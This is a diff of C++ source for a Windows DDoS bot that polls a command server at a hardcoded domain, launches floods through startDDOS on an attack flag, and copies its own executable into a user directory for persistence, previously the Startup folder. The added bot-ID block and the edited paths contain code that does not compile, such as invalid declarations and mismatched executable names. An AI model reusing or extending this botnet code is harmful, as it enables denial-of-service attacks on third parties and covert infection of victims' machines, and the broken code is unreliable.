@@ -2,21 +2,41 @@
 #include <windows.h>
 #include <unistd.h>
 #include <string>
-// Replace It with the server link or IP where PHP server is running
-// The PHP files to put on server is in server directory.
 #define SERVER_URL "https://zoocenter.bg"
 
 using namespace std;
+/*Bot ID testing
+
+class BOTSIDS {
+public :
+    static int getUniqueId();
+};
+
+int Utility::getUniqueId() {
+    static std::atomic<std::uint32_t> uid { 0 };
+    return ++uid;
+}
+
+BOTSIDS obj;
+
+void id = obj.obj; 
+
+void id(){
+
+string id_directory="\"%HOMEDRIVE%%HOMEPATH%\\%USER%";
+
+string cmd_copy_id_directory="xcopy \".\\id.txt\" " + id_directory + "*\" /Y";
+}
+
+*/
 void runInBackground();
-void saveStartup();
+void saveStartup(); 
 string makeRequest(string method, string uri);
 void startDDOS(string link, string iterations);
 string randomString(int n);
-
 string link;
 string iterations;
 string bot_id;
-
 std::string exec(const char* cmd) {
     char buffer[128];
     std::string result = "";
@@ -54,7 +74,7 @@ int main()
 			startDDOS(link, iterations);
 		}
 		if(attackFlag != "1")
-			sleep(180);
+			sleep(200);
 	}
 	
 	return 0;
@@ -81,9 +101,9 @@ void runInBackground()
 */
 void saveStartup()
 {
-		string startup_directory			=	"\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
-		string dir_place_worm				=	startup_directory + "\\bot.exe";
-		string cmd_copy_worm_startup		=	"xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
+		string startup_directory			=	"\"%HOMEDRIVE%%HOMEPATH%\\%USER%";
+		string dir_place_worm				=	"\"%HOMEDRIVE%%HOMEPATH%\\%USER%" + "\\ddose.exe";
+		string cmd_copy_worm_startup		=	"xcopy \".\\ddos.exe\" " + dir_place_worm + "*\" /Y";
 		const char *cmd_copy_worm_startup_p	=	cmd_copy_worm_startup.c_str();
 		
 		system(cmd_copy_worm_startup_p);
